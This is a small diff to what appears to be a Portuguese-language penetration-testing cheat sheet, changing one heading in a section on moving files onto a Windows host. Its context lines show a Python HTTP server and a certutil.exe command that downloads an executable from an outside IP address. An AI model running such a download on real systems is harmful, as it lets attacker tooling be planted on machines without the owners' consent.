@@ -4454,7 +4454,7 @@ Subindo uma página local na porta informada usando python ou
         python3 -m http.server 80
 
 
-Se conectando à ele (WINDOWS):
+Se conectando à ele (WINDOWS) Upload de arquivo jogar arquivo no host:
 
         1 - certutil.exe -urlcache -f http://192.200.1.6/file.exe file.exe Faz Download do arquivo
 
